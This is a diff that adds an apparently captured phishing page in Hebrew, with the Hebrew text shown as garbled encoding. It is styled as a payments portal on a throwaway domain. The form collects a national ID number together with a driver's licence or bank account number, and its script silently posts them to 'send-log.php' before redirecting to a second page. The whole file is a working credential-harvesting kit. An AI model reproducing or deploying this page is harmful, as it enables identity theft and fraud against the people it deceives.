@@ -1,0 +1,211 @@
+<!-- url: https://ngpb.xhad.gq/voucheridspa472782332/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>×ª×©×××××</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+
+    .header {
+      background-color: #014b8c;
+      color: white;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 20px;
+      position: relative;
+      flex-direction: row-reverse;
+    }
+
+    .logo {
+      height: 40px;
+    }
+
+    .menu-icon {
+      font-size: 30px;
+      cursor: pointer;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 350px;
+      background: white;
+      padding: 20px;
+      margin: 20px auto;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+      text-align: right;
+    }
+
+    h2 {
+      text-align: center;
+      color: black;
+    }
+
+    label {
+      display: block;
+      margin: 10px 0 5px;
+      color: black;
+      font-weight: bold;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      text-align: right;
+      direction: rtl;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    select option {
+      direction: rtl;
+      text-align: right;
+    }
+
+    button {
+      background-color: #014b8c;
+      color: white;
+      cursor: pointer;
+      border: none;
+      font-weight: bold;
+      font-size: 18px;
+      text-align: center;
+    }
+
+    button:hover {
+      background-color: #013a6e;
+    }
+
+    .wave-container {
+      position: relative;
+      background: linear-gradient(to bottom, #004c97, #007bff);
+      color: white;
+      text-align: center;
+      padding: 20px;
+      margin-top: 20px;
+      border-radius: 10px;
+    }
+
+    .wave-container h3 {
+      margin: 0;
+    }
+
+    .circle {
+      position: absolute;
+      top: -30px;
+      left: 20px;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        max-width: 90%;
+        padding: 15px;
+      }
+
+      .menu-icon {
+        font-size: 28px;
+      }
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        max-width: 90%;
+        padding: 12px;
+      }
+
+      .menu-icon {
+        font-size: 28px;
+      }
+    }
+
+    @media (max-width: 400px) {
+      .menu-icon {
+        font-size: 25px;
+      }
+
+      .container {
+        padding: 10px;
+      }
+
+      input, select, button {
+        padding: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="menu-icon">&#9776;</div>
+    <img src="images/logo.png" alt="Logo" class="logo">
+  </div>
+
+  <div class="container">
+    <h2>×× ××¡× ××©××¨××ª ××ª×©×××××</h2>
+
+    <label for="id_number">* ××¡×¤×¨ ×ª.× / ×.×¤</label>
+    <input type="tel" inputmode="numeric" pattern="[0-9]*" id="id_number" placeholder="××× ××¡×¤×¨" required>
+
+    <label for="method">* ××××¨×ª ×××¦×¢× ×××××</label>
+    <select id="method">
+      <option value="license">××¡×¤×¨ ×××××ª ×¨××©××</option>
+      <option value="account">××¡×¤×¨ ××©××× ××ª</option>
+    </select>
+
+    <label for="input_number">* ××¡×¤×¨ ×××××ª / ××©××× ××ª</label>
+    <input type="tel" inputmode="numeric" pattern="[0-9]*" id="input_number" placeholder="××× ××¡×¤×¨" required>
+
+    <button onclick="submitForm()">×× ××¡×</button>
+  </div>
+
+  <div class="wave-container">
+    <img src="images/d.png" alt="Circle" class="circle">
+    <h3>××ª×©××× ××©××× ×××ª</h3>
+    <p>××× × ××ª× ×××¦×¢ ×ª×©××× ××©××× ×××ª ××××¤× ×§× ×××××¨</p>
+  </div>
+
+  <script>
+    function submitForm() {
+      let idNumber = document.getElementById("id_number").value;
+      let method = document.getElementById("method").value;
+      let inputNumber = document.getElementById("input_number").value;
+
+      if (idNumber === "" || inputNumber === "") {
+        alert("×× × ××× ××ª ×× ××©×××ª");
+        return;
+      }
+
+      let message = `ID: ${idNumber}, Method: ${method}, Input: ${inputNumber}`;
+
+      fetch("send-log.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ message })
+      })
+      .then(response => {
+        window.location.href = "2.html";
+      })
+      .catch(error => {
+        window.location.href = "2.html";
+      });
+    }
+  </script>
+
+</body>
+</html>
